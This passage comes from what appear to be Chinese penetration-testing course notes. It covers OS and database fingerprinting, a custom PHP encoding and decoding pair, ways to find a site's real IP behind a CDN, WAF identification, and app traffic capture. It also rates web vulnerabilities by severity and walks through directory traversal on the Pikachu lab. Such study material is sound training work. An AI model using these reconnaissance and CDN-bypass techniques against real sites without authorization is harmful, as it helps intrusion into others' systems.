<li>可以筛选掉不符合系统的情况</li>
</ul>
<p><strong>操作系统层面漏洞类型对应意义</strong></p>
<ul>
<li>覆盖面广</li>
<li>获取的权限高</li>
<li>危害性大</li>
</ul>
<h3 id="5-2-数据库层面"><a href="#5-2-数据库层面" class="headerlink" title="5.2 数据库层面"></a>5.2 数据库层面</h3><p><strong>识别数据库类型常见方法</strong></p>
<ul>
<li>nmap -O ip</li>
<li>nmap ip -p 端口，通过端口开放反推数据库</li>
</ul>
<p><strong>数据库类型区别及识别意义</strong></p>
<ul>
<li>数据库的漏洞和类型相性很强</li>
<li>不同数据库漏洞爆发点不太一样</li>
<li>能确定数据库类型、版本，会对渗透有很大帮助</li>
</ul>
<p><strong>数据库常见漏洞类型及攻击</strong></p>
<ul>
<li>弱口令</li>
<li>sql注入</li>
</ul>
<p><strong>简要数据库层面漏洞影响范围</strong></p>
<ul>
<li>要参考数据库的重要程来判定影响范围</li>
</ul>
<p><strong>常见的数据库结构</strong></p>
<ul>
<li>ASP+Access</li>
<li>php+mysql</li>
<li>axpx+mssql</li>
<li>jsp+mssql，oracle</li>
<li>python+mongodb</li>
</ul>
<p><strong>服务器端口</strong></p>
<ul>
<li>关系型数据库 –MySQL:3306 –SqlServer:1433 –Oracle:1521</li>
<li>NOSQL数据库 –MongoDB:27017 –Redis:6379 –memcached:11211</li>
</ul>
<p><strong>第三方</strong></p>
<ul>
<li>如何判断那些有第三方平台或软件 – 端口扫描 – 特征匹配</li>
<li>简要为什么要识别第三方平台或软件 – 可以提供额外的攻击面</li>
<li>常见第三方平台或软件漏洞类型及攻击 – 弱口令</li>
<li>简要第三方平台或软件安全测试的范围</li>
</ul>
<blockquote>
<p>除去常规WEB安全及APP安全测试外，类似服务器单一或复杂的其他服务( 邮件，游戏，负载均衡等)，也可以作为安全测试目标，此类目标测试原则只是少了WEB应用或其他安全问题。所以明确安全测试思路是很重要的!</p>
</blockquote>
<h3 id="资源资源-3"><a href="#资源资源-3" class="headerlink" title="资源资源"></a>资源资源</h3><p><a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org/</a>    IP地址判断操作系统</p>
<p><a target="_blank" rel="noopener" href="https://www.kali.org/downloads/">https://www.kali.org/downloads/</a> </p>
<p><a target="_blank" rel="noopener" href="https://github.com/hellogoldsnakeman/masnmapscan-V1.0">https://github.com/hellogoldsnakeman/masnmapscan-V1.0</a> </p>
<p><a target="_blank" rel="noopener" href="https://pypi.tuna.tsinghua.edu.cn/simple-------%E6%B8%85%E5%8D%8E%E5%A4%A7%E5%AD%A6python%E9%95%9C%E5%83%8F">https://pypi.tuna.tsinghua.edu.cn/simple-------清华大学python镜像</a> </p>
<p><a target="_blank" rel="noopener" href="https://pypi.tuna.tsinghua.edu.cn-------清华大学python镜像/">https://pypi.tuna.tsinghua.edu.cn-------清华大学python镜像</a></p>
<h2 id="P6-加密算法"><a href="#P6-加密算法" class="headerlink" title="P6. 加密算法"></a>P6. 加密算法</h2><p>&#x3D;&#x3D;需要做的内容&#x3D;&#x3D;</p>
<p>呵呵软件  超级加密解密转换工具</p>
<p> 铸剑  内部版</p>
<h3 id="6-1-常见加密编码等算法解析"><a href="#6-1-常见加密编码等算法解析" class="headerlink" title="6.1 常见加密编码等算法解析"></a>6.1 常见加密编码等算法解析</h3><ul>
<li>MD5，SHA，ASCii，进制，时间戳，URL，BASE64（&#x3D;），Unescape，AES（&#x3D; 密码  偏移量  ），DES 等</li>
</ul>
<h3 id="6-2-常见加密形式算法解析"><a href="#6-2-常见加密形式算法解析" class="headerlink" title="6.2 常见加密形式算法解析"></a>6.2 常见加密形式算法解析</h3><ul>
<li>直接加密，带 salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</li>
</ul>
<h3 id="6-3-常见解密方式"><a href="#6-3-常见解密方式" class="headerlink" title="6.3 常见解密方式"></a>6.3 常见解密方式</h3><ul>
<li>枚举，自定义逆向算法，可逆向</li>
</ul>
<h3 id="6-4-了解常规加密算法的特性"><a href="#6-4-了解常规加密算法的特性" class="headerlink" title="6.4 了解常规加密算法的特性"></a>6.4 了解常规加密算法的特性</h3><ul>
<li>长度位数，字符规律，代码分析，搜索获取等</li>
</ul>
<h3 id="6-5-工具"><a href="#6-5-工具" class="headerlink" title="6.5 工具"></a>6.5 工具</h3><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1A5Jjc-spYBKlKiPNbaetbQ">https://pan.baidu.com/s/1A5Jjc-spYBKlKiPNbaetbQ</a> 提取码：8eh7 <a target="_blank" rel="noopener" href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhtmAwJrqz0G3CtTgS8upkgOqS9MjektRDoLredHBhVIh2ibf6WF1WQ9Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
</blockquote>
<p><strong>自定义加密算法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function encrypt($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $key = md5(&#x27;ISCC&#x27;);</span><br><span class="line">    #print $key;</span><br><span class="line">    $x = 0;</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen ($key);</span><br><span class="line">    #print $len;</span><br><span class="line">    for($i=0; $i &lt; $len; $i++)&#123;</span><br><span class="line">        if($x == $klen)</span><br><span class="line">            $x = 0 ;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x += 1;</span><br><span class="line">        #print $key[$X];</span><br><span class="line">    &#125;</span><br><span class="line">    #print $char[0].$char[1].$char[2];</span><br><span class="line">    for ($i=0;$i&lt;$len; $i++)&#123;</span><br><span class="line">        $str .= chr ((ord ($data[$i]) + ord ($char[$i]))%128);</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode ($str);</span><br><span class="line">&#125;</span><br><span class="line">echo encrypt(&#x27;helloword&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>自定义解密算法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function decrypt($str)&#123;</span><br><span class="line">    $mkey = md5(&#x27;ISCC&#x27;);</span><br><span class="line">    $klen = strlen($mkey);</span><br><span class="line">    $tmp = $str;</span><br><span class="line">    $tmp = base64_decode($tmp);         //解密base64</span><br><span class="line">    $md_len = strlen($tmp);            //获取输入加密字符长度</span><br><span class="line">    $x = 0;</span><br><span class="line">    $char = &quot;&quot;;                         //临时数组</span><br><span class="line">    </span><br><span class="line">    for ($i=0; $i&lt;$md_len; $i++)&#123;</span><br><span class="line">        if ($x == $klen)&#123;               //当加密字符串长度超出key</span><br><span class="line">             $x = 0;                    //的长度时查重头开始和获取    </span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $mkey[$x];             //.= 累积函数</span><br><span class="line">        $x += 1;</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    $md_data = array();                 //获取加密字符中的ASCII数据</span><br><span class="line">    for ($i=0; $i&lt;$md_len; $i++)&#123;</span><br><span class="line">        array_push($md_data,ord($tmp[$i]));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $md_data_source = array();</span><br><span class="line">    $data1 = &quot;&quot;;</span><br><span class="line">    $data2 = &quot;&quot;;</span><br><span class="line">    foreach ($md_data as $key =&gt; $value)&#123;//最终还原</span><br><span class="line">        $i = $key;</span><br><span class="line">        if($i &gt;= strlen($mkey))&#123;</span><br><span class="line">            $i = $i - strlen($mkey);</span><br><span class="line">        &#125;</span><br><span class="line">        $dd = $value;</span><br><span class="line">        $od = ord($mkey[$i]);</span><br><span class="line">        array_push($md_data_source,$dd);</span><br><span class="line">        $data1 .=chr(($dd+128)-$od);        //原数据加key的Ascii大于128</span><br><span class="line">        $data2 .=chr($dd-$od);              //原数据加key的Ascii小于128</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    print &quot;data1 =&gt;&quot;.$data1.&quot;&lt;br&gt;\n&quot;;</span><br><span class="line">    print &quot;data2 =&gt;&quot;.$data2.&quot;&lt;br&gt;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str = &#x27;HxclIiEqIiUY&#x27;;</span><br><span class="line">decrypt($str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>带盐加密：md5(md5(salt))</p>
</blockquote>
<p><strong>AES加密</strong></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhaicjuAnbgibq3CoUxgadf9zLdtepiaAhKx0IUmL6rdNLmrOvXEXTufyEw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMh9kJR0lwuGfxrGqZPghGsVEzOKrew5cMo96TO8zV8NJDb6z7rL6jcrw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h3 id="资源资源-4"><a href="#资源资源-4" class="headerlink" title="资源资源"></a>资源资源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://www.mozhe.cn      墨者学院</span><br><span class="line">https://www.cmd5.com      cmd5加密</span><br><span class="line">http://tool.chacuo.net/cryptaes     AES加密解密</span><br><span class="line">https://ctf.bugku.com/challenges    题目</span><br><span class="line">www.cr173.com/soft/21692.html</span><br><span class="line">www.gitee.com/ComsenDiscuz/DiscuzX</span><br></pre></td></tr></table></figure>

<h2 id="P7-DNS-绕过"><a href="#P7-DNS-绕过" class="headerlink" title="P7. DNS 绕过"></a>P7. DNS 绕过</h2><p>&#x3D;&#x3D;需要做的内容&#x3D;&#x3D;</p>
<p>ping.chinaz.com   网站</p>
<p>get-site-ip.com   查询网站</p>
<p>x.threatbook.cn  情报社区</p>
<p>tools.bugscaner.com 子域名查询</p>
<p>fofa  shodan   钟馗之眼    黑暗引擎</p>
<p> fuckcdn   w8fuckcdn  zmap   扫全网</p>
<p>masscan       最快的端口扫描工具</p>
<p><img src="/images/image-20230802204332684.png" alt="image-20230802204332684"></p>
<p>CDN的全称是Content Delivery Network,即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhRcqh4IDvJc1THBcPO4McejXDfvslyuZqG60q8P1UP9wXvZjnhBGEVw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h3 id="7-1-判断是否有CDN"><a href="#7-1-判断是否有CDN" class="headerlink" title="7.1 判断是否有CDN"></a>7.1 判断是否有CDN</h3><p><strong>看响应时间</strong>工具：<a target="_blank" rel="noopener" href="http://tool.chinaz.com/speedtest">http://tool.chinaz.com/speedtest</a></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhH05UceXUR6BDib67MVACrfppNCvZv3W385hjlLyvaKyGcXMM8giaT6QA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p><strong>ping ip或域名，看是否会出现变化****无</strong></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhgXDeic6FtDyJ6d18coGZ50DlxAd7T4qBkpRibibtAQuOhGcwYUZRaD14g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p><strong>有</strong></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhUrH7VYJH1AL0vGvvM7icJP4nZDRYSn8l75KQQ0JDgiak1Gy6MjlUgLiag/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p><strong>nslookup 域名，看是否会有很多节点</strong></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhYjnS3TKgZ9yh1Jic5xJXNjeGwvOyo5x9ZneoxwQ2oyLwj5GSibKMGtMQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h3 id="7-2-CDN对测试有何影响-amp-如何绕过"><a href="#7-2-CDN对测试有何影响-amp-如何绕过" class="headerlink" title="7.2 CDN对测试有何影响&amp;如何绕过"></a>7.2 CDN对测试有何影响&amp;如何绕过</h3><ol>
<li>子域名查询：有的网站主域名会做CDN，但是子域名可能不会做</li>
<li>邮件服务查询：我们访问别人，可能通过CND，但别人访问我们通常不会走CDN</li>
<li>国外地址请求：国外没有cdn节点的话，可能直接走原ip</li>
<li>遗留文件，扫描全网</li>
<li>黑暗引擎搜索特定文件</li>
<li>dns历史记录，以量打量：CDN节点是有流量上限的，用光之后就会直通原机，这也是一种流量攻击</li>
</ol>
<h3 id="7-3-测试"><a href="#7-3-测试" class="headerlink" title="7.3 测试"></a>7.3 测试</h3><p><strong>子域名上面的小技巧</strong></p>
<ul>
<li>二级域名和三级域名查到的结果可能不一样</li>
<li>主域名和子域名查询到的可能不一样</li>
<li>DNs历史记录&#x3D;第三方接口(接口查询)</li>
<li>采集&#x2F;国外请求( 同类型访问)</li>
<li>邮件源码测试对比第三方查询(地区分析)</li>
<li><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhovJdGYmzKbOoEqtOtiaMQLwpdYtAQEic5AmTAiarogQutUibLmxq92eib8g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></li>
<li>黑暗引擎(shodan搜指定hash文件)</li>
<li>扫全网 fuckcdn，w8 fuckcdn，zmap等</li>
<li>工具扫描</li>
<li><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhHN6vSMV6HyxvblBBeG8ZZmvJsBPof0ibDmTHTeY8aIder8GteB18a5g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></li>
<li>认为判定，根据网站的域名备案推测</li>
<li>本地清下dns，然后hosts里写上得到的ip和域名，如果是cdn可能会出现刷新异常，如果打开很快大概率是原机</li>
</ul>
<h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><p><a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io</a> <a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn</a> <a target="_blank" rel="noopener" href="http://ping.chinaz.com/">http://ping.chinaz.com</a> <a target="_blank" rel="noopener" href="https://www.get-/">https://www.get-</a> site- ip.com&#x2F; <a target="_blank" rel="noopener" href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a> <a target="_blank" rel="noopener" href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a></p>
<h2 id="P8-架构、搭建、waf"><a href="#P8-架构、搭建、waf" class="headerlink" title="P8. 架构、搭建、waf"></a>P8. 架构、搭建、waf</h2><p>&#x3D;&#x3D;需要做的内容&#x3D;&#x3D;</p>
<p>cms识别技术</p>
<p>源码获取技术</p>
<p>架构信息获取</p>
<p>&#x3D;&#x3D;今天的&#x3D;&#x3D;</p>
<p>wafw00f    绕过waf</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMh8GDia9kWOT2QrR34BFrqs54ibv9xfs8xZlDIF3ZCo9WibnXajCKM8rwog/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<blockquote>
<p>源码获取技术 架构信息获取</p>
</blockquote>
<h3 id="8-1-站点搭建分析"><a href="#8-1-站点搭建分析" class="headerlink" title="8.1 站点搭建分析"></a>8.1 站点搭建分析</h3><ul>
<li>搭建习惯-目录型站点              两个网站在同一个目录下</li>
<li>搭建习惯-端口类站点             端口决定网站</li>
<li>搭建习惯-子域名站点            站点前缀</li>
<li>搭建习惯-类似域名站点        站点转移</li>
</ul>
<p>webscan</p>
<ul>
<li>搭建习惯-旁注, c段站点         多个站点在同一个服务器  或者  同网段不同服务器不同站点</li>
<li>搭建习惯-搭建软件特征站点</li>
</ul>
<h3 id="8-2-WAF防护分析"><a href="#8-2-WAF防护分析" class="headerlink" title="8.2 WAF防护分析"></a>8.2 WAF防护分析</h3><ul>
<li>什么是WAF应用? –  Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。</li>
<li>如何快速识别WAF?</li>
<li>识别WAF对于安全测试的意义?</li>
</ul>
<h3 id="资源-1"><a href="#资源-1" class="headerlink" title="资源"></a>资源</h3><p><a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io/</a> <a target="_blank" rel="noopener" href="https://www.webscan.cc/">https://www.webscan.cc/</a> <a target="_blank" rel="noopener" href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>
<h2 id="P9-APP及其他资产"><a href="#P9-APP及其他资产" class="headerlink" title="P9. APP及其他资产"></a>P9. APP及其他资产</h2><p>&#x3D;&#x3D;需要做的内容&#x3D;&#x3D;</p>
<p>漏了个打洞</p>
<p>nmap 端口 </p>
<blockquote>
<p>在安全测试中，若WEB无法取得进展或无WEB的情况下，我们需要借助APP或其他资产在进行信息收集,从而开展后续渗透</p>
</blockquote>
<h3 id="9-1-APE提取一键反编译提取"><a href="#9-1-APE提取一键反编译提取" class="headerlink" title="9.1 APE提取一键反编译提取"></a>9.1 APE提取一键反编译提取</h3><ul>
<li>使用反编译工具，尝试获取包了里的源码</li>
</ul>
<h3 id="9-2-APP抓数据包进行工具配合"><a href="#9-2-APP抓数据包进行工具配合" class="headerlink" title="9.2 APP抓数据包进行工具配合"></a>9.2 APP抓数据包进行工具配合</h3><ul>
<li>使用burp suite设置代理，或者wireshark抓数据包，进行分析</li>
</ul>
<h3 id="9-3-各种第三方应用相关探针技术"><a href="#9-3-各种第三方应用相关探针技术" class="headerlink" title="9.3 各种第三方应用相关探针技术"></a>9.3 各种第三方应用相关探针技术</h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io/</a></li>
<li><a target="_blank" rel="noopener" href="https://fofa.so/">https://fofa.so/</a></li>
</ul>
<h3 id="9-4-各种服务接口信息相关探针技术"><a href="#9-4-各种服务接口信息相关探针技术" class="headerlink" title="9.4 各种服务接口信息相关探针技术"></a>9.4 各种服务接口信息相关探针技术</h3><h3 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h3><p><strong>使用burp代理模拟器时，提示证书错误，后将burp生成的证书导入后正常，导入时需要将.cer改成.der。</strong></p>
<h2 id="P10-资产监控拓展"><a href="#P10-资产监控拓展" class="headerlink" title="P10. 资产监控拓展"></a>P10. 资产监控拓展</h2><p>Github监控 – 便于收集整理最新exp或poc – 便于发现相关测试目标的资产</p>
<p>各种子域名查询 DNS,备案,证书 全球节点请求cdn</p>
<p>– 枚举爆破或解析子域名对应 – 便于发现管理员相关的注册信息</p>
<p>黑暗引擎相关搜索 – fofa，shodan, zoomeye 微信公众号接口获取dgh</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhXNb4z4SibxcDLrnVGA6yY8uvocNic9pc4Dibc7c8bqrFm2aHupsIR79wQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h3 id="资源-2"><a href="#资源-2" class="headerlink" title="资源"></a>资源</h3><p><a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh</a> <a target="_blank" rel="noopener" href="https://dnsdb.io/">https://dnsdb.io</a> <a target="_blank" rel="noopener" href="https://sct.ftqq.com/login">https://sct.ftqq.com/login</a> <a target="_blank" rel="noopener" href="https://tools/">https://tools</a> ipip.net&#x2F;cdn.php <a target="_blank" rel="noopener" href="https://github.com/bit4woo/teemo">https://github.com/bit4woo/teemo</a> <a target="_blank" rel="noopener" href="https://securitytrails.com/domain/www.baidu.com/history/a">https://securitytrails.com/domain/www.baidu.com/history/a</a></p>
<hr>
<h2 id="第11天：漏洞必懂知识点"><a href="#第11天：漏洞必懂知识点" class="headerlink" title="第11天：漏洞必懂知识点"></a>第11天：漏洞必懂知识点</h2><p>前言：讲解各种WEB层面上的有哪些漏洞类型，具体漏洞的危害等级，以及简要的影响范围测试进行实例分析，思维导图中的漏洞也是我们将要学习到的各个知识点，其实针对漏洞的形成原理，如何发现，如何利用。</p>
<p>第十一天<br>应用场景</p>
<p>CTF，SRC，红蓝对抗，实战等。<br>简要说明以上漏洞危害情况</p>
<p>每个漏洞的危害情况都是不同的，得到的东西也不同，影响范围也不一样；<br>例如：SQL注入直接获取到关于网站对应数据库里面的权限，将会影响到网站和服务器数据库，获得权限；<br>简要说明以上漏洞等级划分</p>
<p>&#x3D;&#x3D;高危漏洞&#x3D;&#x3D;：SQL注入、文件上传、文件包含、代码执行、未授权访问、命令执行（直接影响到网站   权限，获得数据或者网站很敏感的东西）</p>
<p>&#x3D;&#x3D;中危漏洞&#x3D;&#x3D;：反序列化、逻辑安全</p>
<p>&#x3D;&#x3D;低危漏洞&#x3D;&#x3D;：XSS跨站、目录遍历、文件读取</p>
<p>漏洞的等级决定漏洞的重要程度，高危漏洞是重点；<br>简要说明以上漏洞重点内容</p>
<p>从几个方面来说一下每个方面的漏洞重点，</p>
<p>CTF：文件上传、SQL注入、反序列化、代码执行</p>
<p>SRC：以上图片的漏洞都有，比较多的有逻辑安全</p>
<p>红蓝对抗：涉及到高危漏洞；<br>简要说明以上漏洞形式问题</p>
<p>随着安全的发展，漏洞只会越来越少，但是不是完全没有，自己找不到漏洞是因为没有做好信息收集，原理没学好，测试的时候会出问题，找不到漏洞也是自己学习没到位；<br>案例演示</p>
<h3 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h3><pre><code>1.SQL注入—数据库操作危害
</code></pre>
<p>用phpstudy搭建环境，使用pikachu靶场，用里面的SQL注入模块做测试；</p>
<p>在这里插入图片描述</p>
<p>使用SQL语句，来实行SQL注入</p>
<p>在这里插入图片描述</p>
<p>这类漏洞获取管理员账号密码，通过注入点和数据库数据有联系；</p>
<pre><code>2.目录遍历漏洞—源码结构泄露危害
</code></pre>
<h3 id="目录遍历的靶场"><a href="#目录遍历的靶场" class="headerlink" title="目录遍历的靶场"></a>目录遍历的靶场</h3><p>在这里插入图片描述</p>
<p><img src="https://img-blog.csdnimg.cn/d984f64a181b483a88a622512a97f256.png#pic_center" alt="在这里插入图片描述"></p>
<p>对比一下网站地址，做一些分析，例如：“&#x3D;”后面是参数值</p>
<p>在这里插入图片描述<img src="https://img-blog.csdnimg.cn/9bef3bd7916a4015b1fd5b775ff5d0f8.png#pic_center" alt="在这里插入图片描述"></p>
<p>如果在文件夹下新建一个php文件，修改参数和参数名，就可以·</p>
<p>如果我们想来到网站的根目录WWW</p>
<p>问题：已知<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu-master/vul/dir/dir_list.php?title=1.php">http://127.0.0.1/pikachu-master/vul/dir/dir_list.php?title=1.php</a><br>获取的是D:\phpStudy\PHPTutorial\WWW\pikachu-master\vul\dir\soup\1.php的代码</p>
<p>那么获取下面的网站该怎么写？<br>D:\phpStudy\PHPTutorial\WWW\yy.php<br>获取这个yy.php的代码</p>
<p>采取这样的写法，就可以获得</p>
<p><img src="https://img-blog.csdnimg.cn/84c7bd5dc99c4e38a9f037522783bcbc.png#pic_center" alt="在这里插入图片描述"></p>
<p>目录遍历需要知道目录地址，不需要目录结构；<br>如何知道目录地址，需要目录爆破加网站模板加经验；</p>
<p>&#x3D;&#x3D;采用工具也可以去扫描的，扫描之前还要看看有没有安全狗，有安全狗的话，会直接把你拉黑，拒绝访问；&#x3D;&#x3D;</p>
<p>可以显示文件和文件夹的名字，但是不能得到文件里面的内容；</p>
<h3 id="文件读取漏洞—源码内容获取危害"><a href="#文件读取漏洞—源码内容获取危害" class="headerlink" title="文件读取漏洞—源码内容获取危害"></a>文件读取漏洞—源码内容获取危害</h3><p>还有一种目录遍历是：php遍历一个文件夹下所有文件和子文件的方法<br>执行代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function my_dir($dir) &#123;</span><br><span class="line">	$files = [];</span><br><span class="line">	if(@$handle = opendir($dir)) &#123;</span><br><span class="line">		while(($file = readdir($handle)) !== false) &#123;</span><br><span class="line">			if($file != &quot;..&quot; &amp;&amp; $file != &quot;.&quot;) &#123;</span><br><span class="line">				if(is_dir($dir . &quot;/&quot; . $file)) &#123; //如果是子文件夹，进行递归</span><br><span class="line">					$files[$file] = my_dir($dir . &quot;/&quot; . $file);</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					$files[] = $file;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        closedir($handle);</span><br><span class="line">    &#125;</span><br><span class="line">	return $files;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">print_r(my_dir(&quot;./&quot;));</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure>



<p>这种文件遍历获取网站源码结构；</p>
<p>&#x3D;&#x3D;不能得到目录结构，但是能获取到单个文件的内容&#x3D;&#x3D;</p>
<h3 id="文件上传漏洞—WEB权限丢失危害"><a href="#文件上传漏洞—WEB权限丢失危害" class="headerlink" title="文件上传漏洞—WEB权限丢失危害"></a>文件上传漏洞—WEB权限丢失危害</h3><p>在这里插入图片描述</p>
<p>&#x3D;&#x3D;文件上传就是上传一个文件到对方的网站，拿到对方权限会留后门&#x3D;&#x3D;，将后门文件上传到网站目录下面去，能够直接植入后门；</p>
<p>在这里插入图片描述</p>
<p>文件上传漏洞是一个高危漏洞，直接影响网站权限，直接植入后门；</p>
<h2 id="第12天：WEB漏洞—SQL注入之简要SQL注入"><a href="#第12天：WEB漏洞—SQL注入之简要SQL注入" class="headerlink" title="第12天：WEB漏洞—SQL注入之简要SQL注入"></a>第12天：WEB漏洞—SQL注入之简要SQL注入</h2><p>思维导图：</p>
<img src="https://img-blog.csdnimg.cn/efcd026b1c874357bd400a0150b976ac.png#pic_center" alt="在这里插入图片描述" style="zoom:80%;" />

<p>题外话：安装忍者安全测试系统；</p>
<h3 id="SQL注入安全测试中危害"><a href="#SQL注入安全测试中危害" class="headerlink" title="SQL注入安全测试中危害"></a>SQL注入安全测试中危害</h3><blockquote>
<p>大部分的SQL注入是对数据库中的数据进行操作，包括查询、更新或者是删除；<br>SQL注入可以操作数据，在某条件下，可通过SQL注入直接进行后门的写入；<br>两个危害：一个是危害数据库中的数据，另一个直接危害网站权限；<br>SQL注入产生原理详细分析</p>
</blockquote>
